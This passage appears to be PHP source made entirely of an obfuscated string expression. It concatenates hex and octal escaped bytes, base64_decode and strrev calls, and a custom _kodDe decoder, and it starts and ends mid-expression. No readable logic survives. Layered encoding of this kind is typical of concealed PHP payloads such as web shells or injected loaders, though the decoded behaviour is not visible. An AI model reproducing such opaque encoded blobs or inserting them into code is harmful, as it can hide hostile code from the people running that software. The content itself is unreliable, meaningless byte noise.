â(»îù@'."\n".'≥:í·ääB%”JA⁄≠Iº&*∑\\≤/∞å∫‹?b ›◊;')."\x32\x91\x29\x9c\xc\xfe\xe6\xb5\xbc\x13\x93\x1a\xbe\x71\x6a\x48\x6a\x1e\x46\x4b\x14\xe9\x2e\x3a\x33\x4\xf3\xe4\x42\x52\x63\xd0\xa4\x61\xb9\x63\x4b\x58\x52\x6e\x10\x6\x85\x6f\x46\xd4\x11"."\45\127\200\244\111\160\355\306\327\326\270\255\275\225\176\313\15\26\216\50\103\226\160\304\70\101\124\301\117\162\114\12\325\300\122\112\6\200\144\203\224\2\331\44\172\73\105".base64_decode('MjX6TcjNDXvuRo0WSE2Mwz3lkbYpV5aUWKMpOaXZSQ0/NiDdEG5k4LM4DhDnsJU=')."\x1\x59\x66\xb7\x95\x75\x89\x51\x56\xbc\x11\xbd\x3e\xb2\x14\x71\x48\xb8\x29\xe\x9\x19\x6\x48\xd6\xb\x9b\xd0\xf2\x83\xae\xcb\xe2\x84\x15\x9b\xaf\x2b\x85\xac\x9c\x60\x4d\x2f\xc\x96\x45"."\xb9\xd8\x1a\xd1\x2a\xc1\xd6\xb5\x70\x19\x34\xb2\xce\x59\x22\xc1\xc8\x14\xcd\x32\x9\x45\x6c\x5b\x4e\xe9\xb5\xe6\x2c\x60\xab\xfc\x6c\x1a\xd9\x6e\xf0\x6e\xe0\x20\x3f\xbf\x0\x15\x31\xae\xac".base64_decode('K0mVmosrOZSSXsFApybMTj0Bpp1uOfycNqOQKcAb8ebUGeRaLjnUjQn1km9+gUg=').base64_decode('hGbtB6psknqbhKvrMBnJwQ/7AcwHmcS+4F5mLAO4RzqtGGYDuhQnjZNAWya56sA=')."\7\232\24\365\256\111\340\23\41\202\360\206\150\236\327\113\204\220\74\374\16\25\363\160\14\32\204\126\245\110\257\134\74\255\74\216\307\53\311\123\10\146\204\76\364\223\4".base64_decode('NG+7FfGgdU42FgC/QCJIGsi+l0xaUqQhXOiNySlyndCft0M4zcfSihkjMgYZ9CY=')."\117\330\337\34\353\364\320\273\47\162\241\340\66\222\75\206\33\32\212\252\175\112\100\215\273\341\135\135\70\60\256\70\65\322\101\314\67\46\307\65\335\244\255\56\302\53\104"."\x3d\x62\xdd\xf8\x3b\xc4\x9\xc\x76\xc\xa1\xf9\x7\x3a\x65\x8a\xd4\x50\x0\x6d\xcd\x33\x93\x63\x23\x2b\x53\x81\xdf\x0\x1d\x50\xf3\xa\x23\xcd\xa2\xc1\x8e\xd9\xa0\x79\x7e\xc\x8\x15\x74"."\165\5\144\34\113\322\335\164\300\337\24\363\372\103\154\232\231\364\76\251\247\323\37\13\207\203\2\42\140\17\70\307\150\20\170\76\274\71\307\15\31\140\210\337\240\203\47"."\171\242\331\240\50\354\300\333\366\360\136\103\130\42\106\265\200\306\233\333\74\41\166\167\241\336\125\343\32\317\323\202\12\143\360\12\107\43\275\276\33\216\170\102\145\74\57"."\140\217\14\4\333\304\13\3\311\320\26\234\43\65\7\3\135\355\35\141\354\152\0\303\73\202\102\74\262\120\47\321\324\57\103\151\64\51\336\327\31\360\64\373\44\177\107"."\x24\x48\xaf\xa0\x30\x9b\x61\x74\xf9\x28\xcc\xc2\x14\x5\xba\xa1\x30\x8f\xb\x24\x3f\xe\x88\x17\xa4\xc4\x12\x59\x49\x64\xe6\xcc\x77\x54\x46\x2b\xa2\xd5\xd1\xaa\xe8\xd8\x45\xae\xa8\xb1\xc0".base64_decode('LQ4JWZI7vaRLDeyLrePt4fAscq8uGPI0B2j1gPTJZ7DZjz/evuzOPQ9c+PaVG4c=')."\xcf\x5f\x5\xa\xda\xbb\xfe\x9c\xbd\x6b\xef\x3\x62\x10\x14\x7d\x36\x5e\xf0\xf6\x43\x17\xee\xbd\x6c\xd3\xde\xb\x88\xc8\x22\xbd\xb3\xe9\x4f\x7b\x1e\x7c\xf8\xed\xcb\x6e\x1d\xde\x78\xc5\xde"."\313\357\177\173\375\157\160\304\273\177\270\163\170\305\255\254\141\322\273\227\76\264\367\302\233\230\70\204\245\40\7\310\375\356\271\253\336\176\160\43\24\206\156\370\365\336\173"."\127\356\275\152\325\360\212\353\206\327\335\372\366\205\233\206\257\137\76\374\333\125\357\154\132\163\212\235\170\160\170\76\105\77\61\146\161\57\214\32\325\125\30\245\121\143\34"."\x44\xe7\x58\xf0\x5b\x5\x6f\xb1\x80\x5f\x6a\x8c\x8f\xec\xb5\x67\x75\xf9\x3a\x9a\x7d\xf6\x5b\x61\x62\x90\xb8\xa8\xa8\xc6\x54\x81\xcd\x93\x88\x20\x6c\x10\x17\x17\x34\x1c\x43\x17\x1\x2b\xf7"."\xd9\x8a\x25\x64\xcc\x85\x46\x9\x8d\xf1\xfa\xc2\xcd\x21\x7f\x93\x8f\xdc\x93\x60\x3\x35\x6\xc9\x6e\xc4\x26\x6\x40\xc3\xa1\xd9\xec\x9b\x5d\x8d\x2c\x71\x2c\x22\x55\x51\x2\x1e\x2b\x59\x3a"."\42\273\22\132\266\230\313\243\306\112\25\320\314\256\302\1\131\32\222\1\245\12\270\126\2\200\222\0\323\255\12\72\32\100\166\330\225\363\52\35\65\216\361\143\45\342\165"."\4\347\40\136\106\244\12\142\256\317\362\131\52\161\304\55\241\361\216\232\261\122\105\241\247\202\264\213\343\25\264\76\206\123\32\222\354\250\42\15\26\233\313\323\2\166\150".strrev('R± ÊW„Ñÿ”"VtéâMk√ßíaÿR„¿ÁãÑêÁã_ÉÚƒ%-Ó¨∫ò').base64_decode('nNw+KROJslmQ0WhBRtU4whs6W9l446slEr55iJslG3SgCBQNFYTi0aJpNdANMDg=')."\70\75\370\140\61\360\22\6\53\11\260\40\26\101\107\20\302\331\40\226\211\103\236\140\52\260\254\207\373\231\63\322\224\275\21\17\44\355\363\130\37\50\55\113\124\42\141"."\176\144\340\35\112\137\244\271\15\123\171\130\40\363\144\174\214\205\120\71\72\45\13\211\260\355\5\111\207\247\13\144\10\43\120\72\177\107\113\60\324\216\357\16\206\233\333"."\174\355\36\27\141\334\230\22\160\172\50\121\111\215\122\45\344\174\30\124\151\101\77\252\210\242\54\202\152\5\363\52\146\2\331\11\143\241\220\46\215\41\243\57\241\33\345".base64_decode('MsrSWIkdNJAimdujYCgSAwgg7FngupXCCiEY68MrcH1U0k/JCVOjfimSceodCRQ=')."\16\313\154\16\166\264\370\351\65\111\157\334\22\347\15\371\241\123\0\122\255\104\113\210\161\133\33\20\50\120\55\70\370\346\27\342\141\4\133\321\101\200\57\350\60\106\160".strrev('vÆé±6;·É'."\r".'nÏ9°ÇÃ=ßêû"0Ã±∑}óéuº‰ı¥'."\0".'Ç∞.o∞w	´“')."\xce\xcf\x3\x9e\xd9\x80\x14\x82\x5c\xe4\xa0\xbc\xb8\xca\x55\x3d\x63\x6c\x14\xdf\x53\xc4\x9f\xf8\xe7\x74\x1a\x82\x77\xb7\x16\x2c\x1e\xef\x90\x26\x2e\x1d\x4b\xd2\xd0\x9b\x7d\x31\x33\x3\xc4".base64_decode('uRivZVYgFgi24jByHuXLJ/meQpovAeE4woVjgy5MjNYlQKESvvwsdQTneLgnIiE=').base64_decode('AkPInWuJ+ydyL5wf7Y+6gBRgLOLXD71NEpUvmpE6AGsNSG4PXSsXOciyEMtqaSY=')._kodDe('LmXhmWhwPNdv/8IAtPY5T6BUHS3ZbDQi8U0GLQLaHdFkjysaQCp5g2iuUlCp/RF3')."\x2d\x17\x56\x63\xc8\xb7\xe\x29\x1d\x74\x96\x7c\xe1\xa9\x89\x3\xd3\xc8\xf\xd9\x48\x4d\x23\x28\x20\xc1\xe9\x8d\x6c\x4c\x7d\xb3\x96\x74\x80\xbf\xad\x91\x25\x3e\xf0\x37\x0\x7e\x2\x11\x30".strrev('û_ì~Äú>|s"˘5ÖÏ;¯ñE¿_‡%é˛÷^õ‚D2∆#√˛∑”?¿]Ê'."\0".'K*j')."\x70\x15\xd2\x55\xc1\xc7\x18\xbc\x9b\x41\xa2\xf9\x5d\xd\x52\x74\x2c\x56\x85\x90\xe9\x5c\x30\x6e\x6c\x2c\xe6\x36\xba\x8\xd9\x30\x27\x11\x55\x95\xa7\x8e\xaf\x24\xb\x85\x27\xdc\xcc\x59\xac"."\x85\x20\x4a\x69\x1\xdd\xa4\xb0\x12\x2\xf3\x99\x45\xc2\xad\xa1\x60\x57\xa7\x10\x6e\xf3\xcc\xf6\x77\xb4\xd2\x90\xbb\x9a\x7e\x55\x53\xdf\x3d\x5e\x7f\x18\xa0\xa8\x99\x12\x23\x77\xe5\x25\x86"."\x89\x54\x89\x64\x1f\x51\x9c\xb5\x50\xb6\x17\xb0\x6f\x10\x10\x64\x71\x28\xe5\x63\xf6\x6b\x9d\x6c\x4d\x5d\xfe\x80\x57\xbc\xa3\xf\x13\x92\x55\x3\xb1\x6e\xb2\x70\x8c\xa1\x8d\xa3\x61\x74\x5b"."\237\6\40\312\351\67\42\67\32\100\70\240\1\214\0\32\102\350\242\1\344\62\214\6\120\107\151\0\156\73\174\35\64\16\354\352\300\216\214\156\325\62\162\37\273\144\72"."\x35\x19\x17\x7c\x45\x40\xf6\xeb\xc2\x2a\x32\xe8\x47\x4\x6c\x3\x65\xa6\x5d\xb5\x29\x49\x91\x8a\x49\xd8\xe2\x63\x93\x4c\x49\xb8\xeb\xe\xb5\xad\x82\x5a\xc8\x8d\x53\x0\x9\x13\xa5\x1\xbf"."\xd1\x45\x33\x90\x4\xbc\x88\xd2\x29\xbe\x5f\x6d\x46\x54\x33\x6b\xa9\x94\xdc\xc3\x4\x95\xfa\xd1\xe5\x57\xa1\x5a\xb2\x86\x73\x6d\x11\xd6\x2e\xc6\x34\x41\xb7\x8d\xb5\xdd\x44\xf1\xcb\xf5\x30".strrev('£q1¨'."\0".'X¡˝UYJ•m»*™ñíQ?≈d!ªjÀwù_êp§¯áÿãCc≠÷')."\350\17\22\375\206\53\56\72\65\210\161\337\10\56\231\333\253\232\172\121\360\67\206\154\127\301\60\172\370\25\150\246\162\101\161\305\70\114\54\340\115\325\32\240\312\14\102"."\361\164\44\22\23\4\122\127\10\330\17\233\335\260\124\4\163\333\124\246\343\243\207\156\52\100\271\45\203\250\55\227\223\202\41\252\104\153\106\312\307\274\325\131\30\40\211".base64_decode('bAy6DQBSTkzh7c8phsEOPNCqTz/NDL+zLfpE8zZRXBXzZljJktMhbxxZ9fLbMww=')."\x71\x86\x60\xed\x8b\xf4\x79\x1c\xdf\xd8\x5d\x9d\x2d\x23\x29\xc9\xcf\x3a\x2e\xa4\xe2\xc0\x0\xf7\x7e\x6\x55\x69\xbc\xcc\x5\x54\x32\xe5\x9d\x1c\x52\xb\x76\xc5\x5a\x5e\xeb\x54\xf4\x9c\x8a"."\164\204\163\370\125\2\26\57\344\106\167\63\264\37\102\156\61\17\152\350\144\43\353\34\117\23\123\237\227\210\140\44\46\237\61\373\170\60\244\50\257\140\100\215\270\6\51".base64_decode('VicnBKfYGmdqWrucH4xos1WFkKk3OKcjEKROnajHNxxKk5M/sMfRXTRg0g9dJjU=')."\317\241\353\30\124\12\11\176\100\117\21\151\0\15\46\247\111\117\250\271\15\110\240\261\26\77\20\274\175\163\43\274\200\66\220\25\310\264\302\60\11\320\166\352\351\4\60".strrev('ífæl≥so,‡óS<~læƒeÖ]xts`BØó^IˆÀáà§¿^MöZƒ»T').strrev('4ÿ%òMw4HgX…ÊÌÑAÂ≤ﬂL°5Dmªâö?\'õ°≤'."\r".'l∏RWèƒ]£®Uê')."\264\201\205\64\30\232\107\272\157\104\54\374\217\346\42\263\25\251\16\335\350\6\36\21\22\246\42\235\250\23\241\212\10\36\213\1\13\144\137\364\134\221\70\316\341\332\171".base64_decode('D/6Zl0s6QcPJeWFSMZnDEjjLPII7FeH+Yo4xqH7Bp5jcp8CLJlQSLzmJJV0p7Rw=')."\xf3\x50\x63\x3d\xc1\x9a\x19\xf4\xc6\xc2\xc1\xae\x10\x55\xdc\xc1\x30\xba\xca\x16\xf2\x35\xcf\x63\xfa\x34\x6\x6d\xf1\xcc\xb6\x43\xe0\x1c\x88\x78\x5a\xcb\x82\xd9\xa6\x9\xc2\x91\x58\x12\xb"."\5\341\336\321\27\150\261\145\10\267\61\367\156\126\130\54\340\357\230\131\66\42\22\214\265\13\131\60\320\37\361\265\333\141\326\22\302\76\70\177\171\270\51\20\154\26\242"."\375\301\122\114\0\131\310\6\304\133\120\14\4\262\164\164\61\222\105\32\200\110\222\134\2\245\127\147\14\10\277\63\242\113\307\126\105\335\63\134\325\154\357\205\371\211\160"."\351\155\37\140\203\362\375\6\73\0\56\31\24\210\263\221\220\333\345\42\225\260\17\260\73\144\136\162\50\33\45\76\65\303\330\237\210\245\25\266\373\371\364\152\254\313\356"."\x82\xce\x8f\x95\xe9\xb1\xf0\xbc\x30\xc3\x36\x26\xc5\x72\xf1\x16\xfa\xc2\xc9\xc4\x13\x2e\x5b\x62\xf0\xb7\x53\x4c\xa\x8f\x60\xcb\x26\xb4\x10\xa8\xe5\xea\xa0\x8\x72\xa9\x1a\x9f\xb\x7c\xd2"."\x26\xb5\x44\x11\xba\x2c\xe1\x18\xe7\xcb\xc\x0\xb9\xf8\x12\x4b\xe7\x1d\x53\x13\x90\x45\xc6\x29\x7a\x1f\x85\x38\x15\xa5\x85\x64\xdc\xb6\x62\x10\x0\x3f\x46\x11\xd6\x15\xe\xac\xa5\x16\x16"."\xf3\x9c\x39\x67\x32\x1a\x69\x85\x4e\xd4\xa2\x67\xb2\x6\xaa\xba\xe0\xc5\x2c\xa1\xe5\x93\xaa\x70\x1\x57\x4e\x50\xc1\xa0\x98\xe8\x61\xf7\x5b\x21\xcb\x32\x9c\xfd\x2a\x45\xc1\xa9\xcc\xe1\x9".base64_decode('OfqNyci3T0w0suh1Gmo675SzaQ0ICRlq7uSUeyzx3KNeQcuq1LFRrxNUIcThxKA=')."\160\312\370\341\51\16\363\106\10\3\6\13\211\164\201\130\43\73\241\204\14\270\315\106\206\14\310\174\45\206\121\47\32\244\72\342\0\264\5\110\153\302\375\47\352\322\221"."\x5f\xc5\x86\xeb\x3d\xf2\x79\x89\x83\xe\x89\xbb\x13\xa6\x9b\xce\xf2\xc2\x8\xdc\xeb\x8\x17\xba\x28\xd3\xc8\xf5\xf0\xd3\xb1\x5c\xf\x3b\x9b\x4a\x58\x16\x51\xb8\x5e\xf1\x90\x2e\xac\x93\xc4".base64_decode('dy+IaxqkR83k+lXTIFzoSiQ2eC9adH/smROuc7a1e5qdgPXV1k9kC1A0AlYgSks=')."\162\277\121\107\345\142\14\31\67\121\312\0\344\23\42\51\165\66\170\252\325\311\46\6\142\137\171\140\147\226\204\147\166\124\342\301\120\33\361\140\40\227\341\161\30\373\140"."\242\107\343\31\231\65\30\166\3\177\225\253\167\156\331\172\347\226\253\167\256\255\336\271\245\365\142\220\215\110\345\102\241\31\73\365\25\271\211\5\224\20\3\224\343\246\340"."\x9\xa5\x78\xb2\x49\xf6\xa0\xd8\xc2\xca\x5\xa2\xbd\x58\xf8\x4b\xb2\xf4\x6\xff\x62\x13\x21\x25\x4c\x11\x4b\x71\x2e\x6a\xe2\x42\x19\xbc\x41\x19\x7c\x56\x36\xcc\xd9\x16\x57\x1d\x3f\xea\x12"."\23\336\47\157\147\342\72\223\261\334\232\141\270\241\373\57\44\131\262\303\375\140\230\52\335\254\175\302\276\362\205\335\41\161\110\304\274\63\62\337\215\334\301\43\326\225\340"."\157\37\163\261\0\4\144\117\32\136\223\7\254\215\140\305\67\120\320\14\105\364\65\232\124\220\73\72\166\37\125\160\314\231\223\7\40\363\241\66\17\202\213\116\352\275\122"."\xf4\x5\x6\x11\xe6\xcc\x59\x5c\x4\xf\x38\x41\xd7\x6d\x2e\x2d\xd\x45\xe9\xa1\x1b\x21\x41\x58\x66\x9b\xd7\x4e\xe6\xaa\xd2\xde\x1d\xc8\xa\x38\x1f\xd4\x99\x63\x53\xac\x4b\x77\x96\x5\x38"."\205\33\336\230\33\10\216\156\101\273\110\321\260\231\144\376\146\20\156\350\206\27\377\234\131\256\327\116\235\173\23\5\143\211\135\120\317\124\6\251\137\116\333\14\260\271\362"."\214\266\106\333\243\21\21\115\246\56\247\122\240\331\202\167\100\113\133\176\310\331\50\321\30\235\126\326\275\50\211\104\22\260\133\107\47\365\216\376\30\243\116\344\175\276\14"."\175\316\202\160\102\241\51\176\274\137\50\12\317\40\210\64\1\127\147\346\264\36\156\160\261\217\127\312\26\220\357\125\342\253\231\71\103\5\350\311\67\151\111\262\324\55\256"."\x0\xd4\x56\xd1\x50\x71\x6a\x15\xf8\x1d\x5b\xe1\xa8\x80\x82\x12\xa\xc3\x91\x82\x0\xd4\x8e\x8a\x86\x53\xab\xd0\xc7\x58\xe2\xd4\x60\x88\x98\xcd\xa\xce\xe\xf9\x9\x5\xd9\xda\xce\x90\x4d"."\x53\xd0\xad\xcd\x40\xd8\x80\xf3\xbb\xd6\x5d\xeb\xee\x27\x73\x7e\x46\x2f\xac\x91\x3b\x5b\xb7\xf3\xf9\x81\x18\x60\x6d\xd4\x2a\x24\x26\x32\x58\xc2\xba\x9\xd6\xc5\x98\x36\xd6\x12\xca\x7a\xdb"."\275\365\224\123\172\332\317\164\162\367\243\323\146\14\344\262\22\331\365\64\126\216\167\325\124\112\324\127\177\143\145\127\244\305\71\271\162\306\364\221\323\232\221\246\335\124\332"._kodDe('LpqRqgy1ZsGLNNkmJT79BhFLYOszO7pBKA4+4sIpUEzz1xgAOmZUPiEttdayowVP')."\xd3\xc9\x31\x2\x61\xa2\xb5\x35\x75\x22\xdd\x12\x12\x31\xe8\xf4\x45\xf7\xa8\x1b\xa0\xae\x8c\x76\xbf\xab\x30\x58\xcc\x3b\xe1\x96\xd8\x19\x16\x3d\x5a\xd9\x3c\x50\xd7\x58\xd3\xc3\x4d\xad\x35"."\275\310\376\22\234\105\344\370\47\366\30\336\40\211\156\344\5\177\233\116\270\356\343\231\107\365\53\4\6\71\43\5\251\242\367\122\112\327\220\355\305\254\154\357\164\133\173"."\x21\xaa\x9d\x40\x96\x82\xf4\xf\x26\x15\x58\x62\x4d\xa5\x5c\x12\xab\xaf\x72\xbb\x7\x73\x3b\x16\x50\x16\x38\xb8\x4e\xd1\x35\xfa\x0\x10\xa4\x61\x34\x74\xaa\xec\x84\xe3\xeb\x54\x93\xfb\x8a".strrev('Ë.Ãªld…›¡∏gïüÑÍ4˘ä*À'."\n".'“,Y∆‰Ëï{I™*È% TÑSl∫ì·')."\60\113\335\22\203\311\53\325\116\150\250\237\2\376\20\366\110\17\236\212\5\263\221\175\122\267\305\247\270\123\224\17\160\307\346\264\157\160\300\55\276\232\5\60\107\43\233"."\341\224\201\130\322\361\326\132\334\342\223\216\342\375\243\340\241\32\51\133\361\114\202\47\261\61\346\361\273\14\47\115\52\344\342\207\232\247\327\54\370\66\210\15\110\232\176"."\350\54\275\314\247\110\74\333\303\173\22\207\66\170\364\232\24\150\250\306\105\51\264\254\12\232\315\104\246\230\357\151\24\42\45\123\323\244\234\234\37\44\102\376\30\243\141"."\x8c\x31\x15\x56\xd4\x38\xc6\x55\x97\x32\x40\x80\xf0\x6b\xe6\xad\x11\xae\x23\xdc\x77\x17\x76\x57\x41\x62\xb0\x6a\xd9\x5\xdd\xe9\xbb\xe0\x22\x15\x2a\xa\xf\x84\xc4\xc0\x6a\x64\xb3\xd2\x13"._kodDe('LAyRvtyLCOep7PSPGP7ap2Yt7OV281ddAmjoLraPjxVXzopn9OJMuEYhN7MRSYn6').base64_decode('k1VzaSkBzUwbKyC0QjL0BHVrWeEmrBYl4DunaSrJUgmzSCnQJyf6wtGV06e51ek=')."\x6c\x3c\xb8\xff\x10\x5d\xe3\x56\xb4\x2e\xf7\x68\xb8\x8f\x72\xc3\xa3\xdb\xfc\x69\x90\x0\xc4\x93\x24\x4\x6d\xe1\xde\x42\x24\x69\x9a\x2c\x61\x54\x37\x56\xc2\x73\xb5\x54\xa5\x94\x1\x4b\x36".base64_decode('M06Zbs/cQY8zprllMRJOvpBGpWC2l+pjeuWyCnNPwuYmvVnOzy7NAgt3JcQoPJI=')."\xc8\xce\xb7\x34\xbd\x1b\xe9\x0\xdc\x7c\xdb\x68\x3d\x41\x60\x4a\xf7\x32\x44\xe1\x62\x6f\x92\x14\xe4\x44\xf\x24\x3a\xbe\x42\x90\x3a\x49\x44\x27\xdc\xa9\xe0\x8\x8b\x73\x6f\x53\x38\x2b\x2b"."\102\73\173\244\27\326\371\233\5\213\27\343\202\240\120\260\164\151\51\214\230\330\330\243\74\5\325\16\202\224\143\207\301\315\66\207\201\245\316\132\15\246\132\61\21\207\320"."\64\370\227\347\11\164\264\362\0\236\132\226\310\371\324\232\15\205\242\363\53\135\325\113\227\272\125\172\106\35\255\260\346\165\261\324\70\34\165\131\323\203\236\20\324\263\204"."\x4\x60\x4f\x89\x45\xcc\x33\xc8\xe4\x1b\xe9\xae\xe6\x56\xfd\xec\x2c\x5a\x82\x7\xd4\x8d\x8d\xd3\xe7\xb3\x63\x88\x5\x34\x8e\xca\x89\xea\xf8\xc9\x74\xf8\x87\x32\xce\xc8\x1c\xf6\xd9\xdc\xc1"."\45\141\106\344\230\237\270\220\242\304\143\365\233\71\243\217\371\326\27\215\145\361\267\247\120\20\203\364\211\11\244\22\317\252\161\67\233\355\130\115\356\112\160\363\166\232\4"."\361\32\33\34\36\44\333\42\240\115\62\2\367\1\176\11\4\263\156\73\34\224\305\200\354\143\232\221\320\325\202\151\341\123\370\55\255\12\364\32\102\267\334\47\343\44\25"."\x12\x7d\x9b\xa7\x2\xf9\x7e\xae\x0\x7c\x9\xc7\x10\x86\xc0\x9b\x32\xd\x32\x20\x49\x57\xb2\x8d\x15\xa8\xb9\x46\x46\x51\x40\x7e\xc4\x62\xca\x55\x2\x32\x56\x48\x94\x3b\xe6\x64\x86\x31\xdd"."\xd4\xc0\xda\x48\xf9\x1d\x7d\x87\xa4\x2b\x44\xec\x50\x3d\x1d\xe4\x18\x82\x48\x5d\xa3\x17\xe2\xdf\x53\x47\xb3\xf5\x0\x3e\x7c\x93\x55\x74\x6c\x6c\x87\xb8\xe\x3a\x98\x4a\x71\x6d\x16\x79\x16"."\xa5\x33\x14\x8c\x4\x9b\xe9\xcb\x12\xe5\xd4\x5e\x75\x54\xc4\x35\xf0\xcd\x0\xbe\x15\xa2\x66\xd1\x33\x7d\xf3\xac\x29\x98\xd0\xe0\x26\x10\x32\xfc\x7a\x31\x9f\x67\x27\xff\x50\x8a\x64\x2b\x1b"."\x3e\xd6\x9\x67\x8a\x26\x5f\x13\xa1\x6b\xe8\x8\xbc\x31\x65\x10\xb0\xe0\xcb\xb\x7a\x12\x53\x92\x2e\x4b\xa0\x4c\x32\x7c\xf2\xe\xb\xa1\x73\xc0\xa2\xba\xc0\xc5\x67\x35\xea\xc1\xac\xb6\xa6".base64_decode('psZZMx78YSeORAxrqKkpSVJT04D+4AikcCVYtMaASUu5DUnQryikQYSV59R8kUo=').strrev('X7È”8PWBC$*;Gbêëhù	T›˝ÖS¯ùíËÅ'."\0".'˝¥'."\n".'Ä∂õ∫y°õÛJ')."\xc0\xf0\x20\xa4\x90\xf6\xb2\x5b\x12\x20\x19\x1f\xf8\xa9\xf8\xde\x49\x23\x6b\x94\x2f\x9f\x9c\x2f\x56\xe6\xa2\xc8\xc5\x40\xee\xea\xd4\x49\x23\x9c\xa2\xeb\x70\x92\x9\xb3\x74\x6e\x20\x61\x69"."\x1a\xc8\x3\x16\xd2\x4\xeb\x15\x4\x8\x8a\xd\x74\xff\x8d\xdd\x0\x40\xa1\x2c\xbb\x15\x9\x83\x1d\x2c\x29\x76\x38\x8f\xef\x27\x10\x94\x94\x21\xb0\x8c\xd6\x1f\xe3\x8b\x21\xc\x9e\xc1\x42".base64_decode('CENwW0OpKkl2ZVMJmihbpFREz63JMTi6B9ijZi0XlmJC2SJypsKEoqkHmDQe5lk=')."\37\360\46\50\32\123\22\300\72\370\106\216\166\27\47\36\344\262\24\275\351\205\355\146\32\106\226\214\216\151\37\31\204\166\135\343\267\217\112\36\307\243\41\341\362\41\325"."\x55\x87\x7f\xc4\x68\x83\x42\x7c\x14\x80\xcd\x1c\x9a\x99\x7\x32\xa1\x0\x7b\x94\x2d\x8f\x27\x29\xbc\xdb\x66\x70\xd7\x63\xcd\xcc\xef\xa1\xe8\x8f\xc\x1f\xb\xb\xc6\x3\x6\x71\xae\xcc\xcf"."\x81\x69\x19\x7d\xc2\xd6\xc4\x55\xd0\xb5\x34\x18\x2c\x43\xec\x2b\x80\x77\x96\x7\xb3\xe4\xa5\x29\xcb\x24\x62\x1d\x12\xd3\x89\x40\x68\x99\x44\x9f\x10\x23\x74\xc7\x6f\x35\xc9\xfc\x71\x43\x21"."\x29\xbf\xdf\x23\x0\xad\xb6\x43\x42\x44\x33\x7b\xc6\x42\x4\xc2\xad\x8e\x78\xf2\x8f\xee\xa0\x5a\xcb\x80\x7b\x28\x2b\x84\xb5\xec\x7\x68\x85\xee\x7d\x4d\xf2\xdc\x9c\x70\x23\x8d\x24\xe3\x9c"."\0\352\45\104\15\251\252\121\243\2\210\15\176\300\147\205\143\30\336\211\46\104\167\247\21\144\102\225\125\350\113\167\204\335\40\272\207\5\40\343\13\33\2\71\255\222\311".base64_decode('1tgoZrPGvfXbi+nHpTQVRCFTpIlaZIi+mKgkgJOujT2wVoborIRVQkFIxwwLaGA=')."\xfc\x49\x8\x81\xed\xf\x95\x90\x92\xb4\xbd\xbd\x45\x85\x4a\x75\x2\x33\x93\x4c\xce\xca\x8\xe3\x89\x64\x74\xcd\x34\xc5\x4b\xc8\x9e\xa4\xc0\x81\x3\xe2\x9a\x1e\xc1\x59\x9c\xd3\x79\x3d\x96"."\x43\x27\xc1\x55\x29\x4b\xa\xd6\x12\x5a\xbb\x4c\xd7\x17\x64\xe9\x83\x5c\x6c\xb\x9b\x10\x5b\xd0\x6e\xd\x84\x56\x7\x93\xf2\x7f\xea\xe3\x35\xcf\x1e\x41\x81\xc3\x19\x16\x8c\x31\xca\xd4\x40"."\x32\xb1\x2c\x64\x91\xd2\x95\x84\xa6\xa3\xdd\xa8\x70\xa3\x32\x6f\x86\x94\xb4\x18\xc\x68\x6c\x17\xe\xf\x39\x94\x32\x45\xc0\x2b\xf3\x2\x89\x43\x2a\x0\xfb\xc3\xa2\x78\x1\x5f\x70\x11\xb"."\x42\x82\x4f\x5e\x41\xd8\x70\x8e\x97\x98\x94\x12\xc3\x25\xe3\xc0\x38\x21\x2\xa5\x2f\x27\xb0\xd8\xd4\x45\x82\xfd\x25\xda\xfe\x86\x8b\x71\xa6\x99\xb7\x89\x11\xd4\xa4\x53\x12\x57\x69\x6a\xa3"."\11\13\100\167\231\141\17\14\61\16\24\13\335\101\362\236\211\131\120\235\45\131\160\34\134\131\271\61\247\30\143\200\375\22\104\325\276\143\312\124\205\242\4\214\46\230\137"."\5\202\35\216\44\22\61\250\120\203\57\347\370\132\347\4\352\161\107\364\141\200\27\137\202\137\50\337\12\144\0\245\160\312\7\211\365\26\111\307\323\150\302\103\153\350\336"."\57\277\322\210\256\70\263\361\104\167\241\131\110\27\326\55\205\131\166\241\113\301\42\133\341\47\317\330\340\13\46\350\52\27\217\61\4\243\275\26\173\70\133\2\60\63\254"."\361\304\357\157\316\362\160\56\240\3\213\121\205\255\20\342\333\131\364\147\214\162\361\176\160\323\102\0\322\260\167\141\1\61\374\4\35\137\227\246\66\221\214\57\161\160\104"."\143\300\322\123\170\27\263\11\45\327\135\310\213\146\125\143\341\165\27\213\316\243\175\220\135\133\0\43\331\3\27\11\146\230\147\210\1\32\313\210\323\260\4\260\41\213\45".base64_decode('NwOxVP0KubnC9uadbZ1uBmqiaGIXUMnGjr+RRUy8yNWRfoB3rZ9MsOYGZttDH+I=').base64_decode('7c+pCSkQbPU3ewJef3imlFZM4Tlp5L/bOt2RugoPDqX8OHNhDT+dcSB4OpNMHDc=')."\xb8\xe0\x2d\x98\xfc\x8\xef\x73\x58\x8b\xc5\x34\xaa\xe8\x25\x25\x2\x31\x3e\x67\x65\x8\x28\xf\x54\xc2\x95\x49\x9d\xe5\x3a\x29\x21\x71\x41\x57\x4a\xd3\xf\x2a\xe8\x35\x5d\xde\x62\x21\x43".strrev('•-q≤8au”¢ì‘^gQöπ“≈9†s9P’>˘´∆Øø%k'."\r".'Mb)Ä5Ú˙HkL±')."\136\111\210\33\6\321\167\257\155\333\214\207\111\164\137\123\240\172\165\362\64\24\367\332\217\202\302\173\12\5\135\126\15\105\0\140\307\376\325\304\354\135\316\146\55\17\36".strrev('…gZ,qÒfË[±˝LœÑzI®G}…5T›ˆ´|Ç\\ß!‡òP√VÀe]h∞BSe')."\233\21\77\372\372\204\203\237\104\304\320\345\176\372\304\15\172\241\233\34\263\260\43\354\30\276\143\317\253\0\373\72\175\260\40\36\5\271\223\156\206\142\374\1\35\362\370".base64_decode('qMIXBriQDJOT0mB1eJsENm3wTISK01TbAvgBwbPlKNT2jobd4s/yIm1JHdAGa98=').base64_decode('5YB8EldFsARSo1SDH2hhPrilafSqEa8C+abw5QqmZSfYJlrsCijGACS8cOkf2pM=')."\150\271\301\22\200\105\43\21\240\355\142\66\147\320\3\171\76\245\211\150\100\374\23\232\137\343\327\223\360\226\323\1\304\167\305\54\175\120\1\147\377\77\311\210\43\303\202"."\45\236\265\220\322\6\31\366\325\213\113\122\360\255\210\214\326\157\175\102\11\102\354\257\103\130\336\205\20\150\37\335\117\25\137\262\240\357\11\0\41\325\362\350\207\120\340"."\x18\xfc\x13\x25\xbf\x74\x4d\xb1\x17\x8d\xb9\x8\xa9\x7d\x2c\x23\x95\xe6\x8c\x9a\x4d\xea\xcc\x24\x82\x3\xda\x15\xbe\x7b\x44\xb9\xa0\x55\x80\x4c\x9f